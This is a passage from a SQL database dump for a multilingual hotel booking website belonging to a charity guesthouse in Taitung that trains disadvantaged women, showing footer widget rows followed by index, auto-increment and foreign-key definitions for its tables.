(1, 5, '關於我們', 1, 'footer_col_1', 1, '', '', '<p><span style=\"color:hsl(0, 0%, 100%);\">隸屬</span><a href=\"http://www.goh.org.tw/\"><span style=\"color:hsl(180, 75%, 60%);\">勵馨基金會</span></a><span style=\"color:hsl(0, 0%, 100%);\">的愛馨會館，是全台首創公益旅店，創立的初衷是培養台東弱勢婦女自信及就業技能，婦女可以在這個友善的環境裡，學習旅館/民宿相關的房務整理、櫃檯接待等技能。這裡的每一份營收，都用於公益，幫助/支持更多有需要的弱勢婦女。</span></p><p><span style=\"color:hsl(0, 0%, 100%);\">竭誠歡迎您，前來體驗會館舒適、簡約風格的住宿設施與貼心服務，感受一下台東山水之外的人文之美。</span></p>', '', 1, 1),
(3, 1, 'Derniers articles', 1, 'footer_col_2', 1, '', 'latest_articles', '', '', 2, 2),
(3, 2, '最新文章', 1, 'footer_col_2', 1, '', 'latest_articles', '', '', 2, 2),
(3, 3, 'المقالات الأخيرة', 1, 'footer_col_2', 1, '', 'latest_articles', '', '', 2, 2),
(3, 5, '最新文章', 1, 'footer_col_2', 1, '', 'latest_articles', '', '', 2, 2),
(4, 1, 'Contactez-nous', 1, 'footer_col_2', 1, '', 'contact_informations', '', '', 1, 3),
(4, 2, '聯繫資訊', 1, 'footer_col_2', 1, '', 'contact_informations', '', '', 1, 3),
(4, 3, 'اتصل بنا', 1, 'footer_col_2', 1, '', 'contact_informations', '', '', 1, 3),
(4, 5, '聯繫資訊', 1, 'footer_col_2', 1, '', 'contact_informations', '', '', 1, 3),
(5, 1, 'Footer form', 0, 'footer_col_3', 1, '', 'footer_form', '', 'footer-form mt10', 2, 4),
(5, 2, 'Footer form', 0, 'footer_col_3', 1, '', 'footer_form', '', 'footer-form mt10', 2, 4),
(5, 3, 'Footer form', 0, 'footer_col_3', 1, '', 'footer_form', '', 'footer-form mt10', 2, 4),
(5, 5, 'Footer form', 0, 'footer_col_3', 1, '', 'footer_form', '', 'footer-form mt10', 2, 4),
(6, 1, 'Blog side', 0, 'right', 0, '17', 'blog_side', '', '', 1, 5),
(6, 2, 'Blog side', 0, 'right', 0, '17', 'blog_side', '', '', 1, 5),
(6, 3, 'Blog side', 0, 'right', 0, '17', 'blog_side', '', '', 1, 5),
(6, 5, 'Blog side', 0, 'right', 0, '17', 'blog_side', '', '', 1, 5),
(7, 1, '', 0, 'footer_col_3', 1, '', '', '', '', 1, 6),
(7, 2, '布告欄', 0, 'footer_col_3', 1, '', '', '', '', 1, 6),
(7, 3, '', 0, 'footer_col_3', 1, '', '', '', '', 1, 6),
(7, 5, '布告欄', 0, 'footer_col_3', 1, '', '', '', '', 1, 6);

--
-- 已傾印資料表的索引
--

--
-- 資料表索引 `pm_activity`
--
ALTER TABLE `pm_activity`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `activity_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_activity_file`
--
ALTER TABLE `pm_activity_file`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `activity_file_fkey` (`id_item`,`lang`),
  ADD KEY `activity_file_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_activity_session`
--
ALTER TABLE `pm_activity_session`
  ADD PRIMARY KEY (`id`),
  ADD KEY `activity_session_fkey` (`id_activity`);

--
-- 資料表索引 `pm_activity_session_hour`
--
ALTER TABLE `pm_activity_session_hour`
  ADD PRIMARY KEY (`id`),
  ADD KEY `activity_session_hour_fkey` (`id_activity_session`);

--
-- 資料表索引 `pm_article`
--
ALTER TABLE `pm_article`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `article_lang_fkey` (`lang`),
  ADD KEY `article_page_fkey` (`id_page`,`lang`);

--
-- 資料表索引 `pm_article_file`
--
ALTER TABLE `pm_article_file`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `article_file_fkey` (`id_item`,`lang`),
  ADD KEY `article_file_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_booking`
--
ALTER TABLE `pm_booking`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_booking_activity`
--
ALTER TABLE `pm_booking_activity`
  ADD PRIMARY KEY (`id`),
  ADD KEY `booking_activity_fkey` (`id_booking`);

--
-- 資料表索引 `pm_booking_payment`
--
ALTER TABLE `pm_booking_payment`
  ADD PRIMARY KEY (`id`),
  ADD KEY `booking_payment_fkey` (`id_booking`);

--
-- 資料表索引 `pm_booking_room`
--
ALTER TABLE `pm_booking_room`
  ADD PRIMARY KEY (`id`),
  ADD KEY `booking_room_fkey` (`id_booking`);

--
-- 資料表索引 `pm_booking_service`
--
ALTER TABLE `pm_booking_service`
  ADD PRIMARY KEY (`id`),
  ADD KEY `booking_service_fkey` (`id_booking`);

--
-- 資料表索引 `pm_booking_tax`
--
ALTER TABLE `pm_booking_tax`
  ADD PRIMARY KEY (`id`),
  ADD KEY `booking_tax_fkey` (`id_booking`);

--
-- 資料表索引 `pm_comment`
--
ALTER TABLE `pm_comment`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_country`
--
ALTER TABLE `pm_country`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_coupon`
--
ALTER TABLE `pm_coupon`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_currency`
--
ALTER TABLE `pm_currency`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_email_content`
--
ALTER TABLE `pm_email_content`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `email_content_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_facility`
--
ALTER TABLE `pm_facility`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `facility_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_facility_file`
--
ALTER TABLE `pm_facility_file`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `facility_file_fkey` (`id_item`,`lang`),
  ADD KEY `facility_file_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_ical_event`
--
ALTER TABLE `pm_ical_event`
  ADD PRIMARY KEY (`id`),
  ADD KEY `ical_event_fkey` (`id_room`);

--
-- 資料表索引 `pm_lang`
--
ALTER TABLE `pm_lang`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_lang_file`
--
ALTER TABLE `pm_lang_file`
  ADD PRIMARY KEY (`id`),
  ADD KEY `lang_file_fkey` (`id_item`);

--
-- 資料表索引 `pm_location`
--
ALTER TABLE `pm_location`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_media`
--
ALTER TABLE `pm_media`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_media_file`
--
ALTER TABLE `pm_media_file`
  ADD PRIMARY KEY (`id`),
  ADD KEY `media_file_fkey` (`id_item`);

--
-- 資料表索引 `pm_menu`
--
ALTER TABLE `pm_menu`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `menu_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_message`
--
ALTER TABLE `pm_message`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_package`
--
ALTER TABLE `pm_package`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_page`
--
ALTER TABLE `pm_page`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `page_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_page_file`
--
ALTER TABLE `pm_page_file`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `page_file_fkey` (`id_item`,`lang`),
  ADD KEY `page_file_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_popup`
--
ALTER TABLE `pm_popup`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `popup_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_rate`
--
ALTER TABLE `pm_rate`
  ADD PRIMARY KEY (`id`),
  ADD KEY `rate_room_fkey` (`id_room`);

--
-- 資料表索引 `pm_rate_child`
--
ALTER TABLE `pm_rate_child`
  ADD PRIMARY KEY (`id`),
  ADD KEY `rate_child_fkey` (`id_rate`);

--
-- 資料表索引 `pm_room`
--
ALTER TABLE `pm_room`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `room_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_room_calendar`
--
ALTER TABLE `pm_room_calendar`
  ADD PRIMARY KEY (`id`),
  ADD KEY `room_calendar_fkey` (`id_room`);

--
-- 資料表索引 `pm_room_closing`
--
ALTER TABLE `pm_room_closing`
  ADD PRIMARY KEY (`id`),
  ADD KEY `room_closing_fkey` (`id_room`);

--
-- 資料表索引 `pm_room_file`
--
ALTER TABLE `pm_room_file`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `room_file_fkey` (`id_item`,`lang`),
  ADD KEY `room_file_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_room_lock`
--
ALTER TABLE `pm_room_lock`
  ADD PRIMARY KEY (`id`),
  ADD KEY `room_lock_fkey` (`id_room`);

--
-- 資料表索引 `pm_service`
--
ALTER TABLE `pm_service`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `service_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_slide`
--
ALTER TABLE `pm_slide`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `slide_lang_fkey` (`lang`),
  ADD KEY `slide_page_fkey` (`id_page`,`lang`);

--
-- 資料表索引 `pm_slide_file`
--
ALTER TABLE `pm_slide_file`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `slide_file_fkey` (`id_item`,`lang`),
  ADD KEY `slide_file_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_social`
--
ALTER TABLE `pm_social`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_tag`
--
ALTER TABLE `pm_tag`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `tag_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_tax`
--
ALTER TABLE `pm_tax`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `tax_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_text`
--
ALTER TABLE `pm_text`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `text_lang_fkey` (`lang`);

--
-- 資料表索引 `pm_user`
--
ALTER TABLE `pm_user`
  ADD PRIMARY KEY (`id`);

--
-- 資料表索引 `pm_widget`
--
ALTER TABLE `pm_widget`
  ADD PRIMARY KEY (`id`,`lang`),
  ADD KEY `widget_lang_fkey` (`lang`);

--
-- 在傾印的資料表使用自動遞增(AUTO_INCREMENT)
--

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_activity`
--
ALTER TABLE `pm_activity`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_activity_file`
--
ALTER TABLE `pm_activity_file`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_activity_session`
--
ALTER TABLE `pm_activity_session`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_activity_session_hour`
--
ALTER TABLE `pm_activity_session_hour`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_article`
--
ALTER TABLE `pm_article`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=16;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_article_file`
--
ALTER TABLE `pm_article_file`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=31;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_booking`
--
ALTER TABLE `pm_booking`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=253;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_booking_activity`
--
ALTER TABLE `pm_booking_activity`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_booking_payment`
--
ALTER TABLE `pm_booking_payment`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_booking_room`
--
ALTER TABLE `pm_booking_room`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=451;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_booking_service`
--
ALTER TABLE `pm_booking_service`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_booking_tax`
--
ALTER TABLE `pm_booking_tax`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_comment`
--
ALTER TABLE `pm_comment`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_country`
--
ALTER TABLE `pm_country`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=251;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_coupon`
--
ALTER TABLE `pm_coupon`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_currency`
--
ALTER TABLE `pm_currency`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=10;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_email_content`
--
ALTER TABLE `pm_email_content`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_facility`
--
ALTER TABLE `pm_facility`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=40;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_facility_file`
--
ALTER TABLE `pm_facility_file`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=44;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_ical_event`
--
ALTER TABLE `pm_ical_event`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_lang`
--
ALTER TABLE `pm_lang`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_lang_file`
--
ALTER TABLE `pm_lang_file`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=6;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_location`
--
ALTER TABLE `pm_location`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_media`
--
ALTER TABLE `pm_media`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_media_file`
--
ALTER TABLE `pm_media_file`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_menu`
--
ALTER TABLE `pm_menu`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=21;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_message`
--
ALTER TABLE `pm_message`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=452;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_package`
--
ALTER TABLE `pm_package`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_page`
--
ALTER TABLE `pm_page`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=20;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_page_file`
--
ALTER TABLE `pm_page_file`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_popup`
--
ALTER TABLE `pm_popup`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_rate`
--
ALTER TABLE `pm_rate`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=121;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_rate_child`
--
ALTER TABLE `pm_rate_child`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_room`
--
ALTER TABLE `pm_room`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=18;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_room_calendar`
--
ALTER TABLE `pm_room_calendar`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_room_closing`
--
ALTER TABLE `pm_room_closing`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=38;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_room_file`
--
ALTER TABLE `pm_room_file`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=67;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_room_lock`
--
ALTER TABLE `pm_room_lock`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=517;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_service`
--
ALTER TABLE `pm_service`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=5;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_slide`
--
ALTER TABLE `pm_slide`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=33;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_slide_file`
--
ALTER TABLE `pm_slide_file`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=27;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_social`
--
ALTER TABLE `pm_social`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_tag`
--
ALTER TABLE `pm_tag`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_tax`
--
ALTER TABLE `pm_tax`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=3;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_text`
--
ALTER TABLE `pm_text`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=186;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_user`
--
ALTER TABLE `pm_user`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=30;

--
-- 使用資料表自動遞增(AUTO_INCREMENT) `pm_widget`
--
ALTER TABLE `pm_widget`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=8;

--
-- 已傾印資料表的限制式
--

--
-- 資料表的限制式 `pm_activity`
--
ALTER TABLE `pm_activity`
  ADD CONSTRAINT `activity_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_activity_file`
--
ALTER TABLE `pm_activity_file`
  ADD CONSTRAINT `activity_file_fkey` FOREIGN KEY (`id_item`,`lang`) REFERENCES `pm_activity` (`id`, `lang`) ON DELETE CASCADE ON UPDATE NO ACTION,
  ADD CONSTRAINT `activity_file_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_activity_session`
--
ALTER TABLE `pm_activity_session`
  ADD CONSTRAINT `activity_session_fkey` FOREIGN KEY (`id_activity`) REFERENCES `pm_activity` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_activity_session_hour`
--
ALTER TABLE `pm_activity_session_hour`
  ADD CONSTRAINT `activity_session_hour_fkey` FOREIGN KEY (`id_activity_session`) REFERENCES `pm_activity_session` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_article`
--
ALTER TABLE `pm_article`
  ADD CONSTRAINT `article_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION,
  ADD CONSTRAINT `article_page_fkey` FOREIGN KEY (`id_page`,`lang`) REFERENCES `pm_page` (`id`, `lang`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_article_file`
--
ALTER TABLE `pm_article_file`
  ADD CONSTRAINT `article_file_fkey` FOREIGN KEY (`id_item`,`lang`) REFERENCES `pm_article` (`id`, `lang`) ON DELETE CASCADE ON UPDATE NO ACTION,
  ADD CONSTRAINT `article_file_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_booking_activity`
--
ALTER TABLE `pm_booking_activity`
  ADD CONSTRAINT `booking_activity_fkey` FOREIGN KEY (`id_booking`) REFERENCES `pm_booking` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_booking_payment`
--
ALTER TABLE `pm_booking_payment`
  ADD CONSTRAINT `booking_payment_fkey` FOREIGN KEY (`id_booking`) REFERENCES `pm_booking` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_booking_room`
--
ALTER TABLE `pm_booking_room`
  ADD CONSTRAINT `booking_room_fkey` FOREIGN KEY (`id_booking`) REFERENCES `pm_booking` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_booking_service`
--
ALTER TABLE `pm_booking_service`
  ADD CONSTRAINT `booking_service_fkey` FOREIGN KEY (`id_booking`) REFERENCES `pm_booking` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_booking_tax`
--
ALTER TABLE `pm_booking_tax`
  ADD CONSTRAINT `booking_tax_fkey` FOREIGN KEY (`id_booking`) REFERENCES `pm_booking` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_email_content`
--
ALTER TABLE `pm_email_content`
  ADD CONSTRAINT `email_content_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_facility`
--
ALTER TABLE `pm_facility`
  ADD CONSTRAINT `facility_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_facility_file`
--
ALTER TABLE `pm_facility_file`
  ADD CONSTRAINT `facility_file_fkey` FOREIGN KEY (`id_item`,`lang`) REFERENCES `pm_facility` (`id`, `lang`) ON DELETE CASCADE ON UPDATE NO ACTION,
  ADD CONSTRAINT `facility_file_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_ical_event`
--
ALTER TABLE `pm_ical_event`
  ADD CONSTRAINT `ical_event_fkey` FOREIGN KEY (`id_room`) REFERENCES `pm_room` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_lang_file`
--
ALTER TABLE `pm_lang_file`
  ADD CONSTRAINT `lang_file_fkey` FOREIGN KEY (`id_item`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_media_file`
--
ALTER TABLE `pm_media_file`
  ADD CONSTRAINT `media_file_fkey` FOREIGN KEY (`id_item`) REFERENCES `pm_media` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_menu`
--
ALTER TABLE `pm_menu`
  ADD CONSTRAINT `menu_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_page`
--
ALTER TABLE `pm_page`
  ADD CONSTRAINT `page_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_page_file`
--
ALTER TABLE `pm_page_file`
  ADD CONSTRAINT `page_file_fkey` FOREIGN KEY (`id_item`,`lang`) REFERENCES `pm_page` (`id`, `lang`) ON DELETE CASCADE ON UPDATE NO ACTION,
  ADD CONSTRAINT `page_file_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_popup`
--
ALTER TABLE `pm_popup`
  ADD CONSTRAINT `popup_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_rate`
--
ALTER TABLE `pm_rate`
  ADD CONSTRAINT `rate_room_fkey` FOREIGN KEY (`id_room`) REFERENCES `pm_room` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_rate_child`
--
ALTER TABLE `pm_rate_child`
  ADD CONSTRAINT `rate_child_fkey` FOREIGN KEY (`id_rate`) REFERENCES `pm_rate` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_room`
--
ALTER TABLE `pm_room`
  ADD CONSTRAINT `room_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_room_calendar`
--
ALTER TABLE `pm_room_calendar`
  ADD CONSTRAINT `room_calendar_fkey` FOREIGN KEY (`id_room`) REFERENCES `pm_room` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_room_closing`
--
ALTER TABLE `pm_room_closing`
  ADD CONSTRAINT `room_closing_fkey` FOREIGN KEY (`id_room`) REFERENCES `pm_room` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_room_file`
--
ALTER TABLE `pm_room_file`
  ADD CONSTRAINT `room_file_fkey` FOREIGN KEY (`id_item`,`lang`) REFERENCES `pm_room` (`id`, `lang`) ON DELETE CASCADE ON UPDATE NO ACTION,
  ADD CONSTRAINT `room_file_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_room_lock`
--
ALTER TABLE `pm_room_lock`
  ADD CONSTRAINT `room_lock_fkey` FOREIGN KEY (`id_room`) REFERENCES `pm_room` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_service`
--
ALTER TABLE `pm_service`
  ADD CONSTRAINT `service_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_slide`
--
ALTER TABLE `pm_slide`
  ADD CONSTRAINT `slide_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION,
  ADD CONSTRAINT `slide_page_fkey` FOREIGN KEY (`id_page`,`lang`) REFERENCES `pm_page` (`id`, `lang`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_slide_file`
--
ALTER TABLE `pm_slide_file`
  ADD CONSTRAINT `slide_file_fkey` FOREIGN KEY (`id_item`,`lang`) REFERENCES `pm_slide` (`id`, `lang`) ON DELETE CASCADE ON UPDATE NO ACTION,
  ADD CONSTRAINT `slide_file_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_tag`
--
ALTER TABLE `pm_tag`
  ADD CONSTRAINT `tag_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_tax`
--
ALTER TABLE `pm_tax`
  ADD CONSTRAINT `tax_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_text`
--
ALTER TABLE `pm_text`
  ADD CONSTRAINT `text_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;

--
-- 資料表的限制式 `pm_widget`
--
ALTER TABLE `pm_widget`
  ADD CONSTRAINT `widget_lang_fkey` FOREIGN KEY (`lang`) REFERENCES `pm_lang` (`id`) ON DELETE CASCADE ON UPDATE NO ACTION;
COMMIT;

